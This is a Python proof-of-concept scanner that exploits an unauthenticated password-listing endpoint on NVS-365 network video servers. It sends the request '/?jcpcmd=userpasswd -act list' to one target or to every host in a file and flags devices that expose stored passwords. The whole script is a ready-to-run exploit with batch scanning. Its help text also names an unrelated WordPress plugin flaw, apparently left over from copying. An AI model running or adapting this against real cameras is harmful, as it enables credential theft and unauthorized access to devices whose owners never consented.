#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 网络视频服务器：NVS365 
#摄像头未授权访问密码信息（NVS-365-V01)
# VS-365-V01 V2.3.4-20131230
#读取密码信息
# url:http://ip:port/?jcpcmd=userpasswd%20-act%20list
import requests
import argparse
import sys
import urllib3
import threading
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
 ___________   _____________         ________   ________.________                                        
 \      \   \ /   /   _____/         \_____  \ /  _____/|   ____/                  ______   ____   ____  
 /   |   \   Y   /\_____  \   ______   _(__  </   __  \ |____  \   ______   ______ \____ \ /  _ \_/ ___\ 
/    |    \     / /        \ /_____/  /       \  |__\  \/       \ /_____/  /_____/ |  |_> >  <_> )  \___ 
\____|__  /\___/ /_______  /         /______  /\_____  /______  /                  |   __/ \____/ \___  >
        \/               \/                 \/       \/       \/                   |__|               \/ 
                                                                                                                                                                                                       
                                                                                        Author:sylon
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        payload = self.url + "/?jcpcmd=userpasswd%20-act%20list"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        
        try:
            res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "Success" in res.text:
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在密码未授权访问！",color)
            else:
                print(f"[x] 目标系统: {self.url} 不存在密码未授权访问!")
        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='WordPress Welcart eCommerce插件 目录遍历（<=2.7.7)')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 poc.py -u http://127.0.0.1\neg2:>>>python3 poc.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
